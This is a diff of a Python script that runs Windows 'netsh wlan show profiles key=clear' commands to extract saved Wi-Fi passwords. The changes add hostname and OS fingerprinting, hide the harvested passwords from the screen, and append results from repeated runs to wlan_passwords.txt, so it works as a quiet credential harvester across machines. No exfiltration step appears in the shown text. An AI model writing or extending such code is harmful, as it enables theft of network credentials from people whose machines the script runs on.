@@ -1,5 +1,6 @@
 import subprocess
 import re
+import platform
 
 def scan_string_for_pattern(input_string, pattern):
     # Split the input string into lines
@@ -46,7 +47,10 @@ if __name__ == "__main__":
             target_profiles = []
             
             if profile_names:
-                print("WLAN Profile Names:")
+                host = f"Hostname: {platform.node()} - OS: {platform.platform()}"
+                #print(host)
+                target_profiles.append(host)
+                #print("WLAN Profile Names:")
                 for profile_name in profile_names:
                     profile_name = profile_name.split("\r")[0]
                     output = subprocess.check_output(["netsh", "wlan", "show", "profiles", f"name={profile_name}", "key=clear"]).decode("utf-8")
@@ -67,21 +71,22 @@ if __name__ == "__main__":
                             target_profile = f"{profile_name} : {keys[0]}"
                             target_profiles.append(target_profile)
 
-                            print(target_profile)
+                            #print(target_profile)
                     else:
                         print("No matches found.")
-                    
             else:
                 print("No WLAN profiles found.")
+
         else:
             print("Failed to retrieve WLAN profiles.")
 
 
-        with open("wlan_passwords.txt", "w") as wlan_file:
+        with open("wlan_passwords.txt", "a") as wlan_file:
             for profile in target_profiles:
                 wlan_file.writelines(profile + "\n")
+            wlan_file.writelines("\n=========================================\n")
 
-        print("\nwlan_password.txt created.\n")
+        print("\n[+] Succefully completed.\n")
 
     except:
         print("Something went wrong")
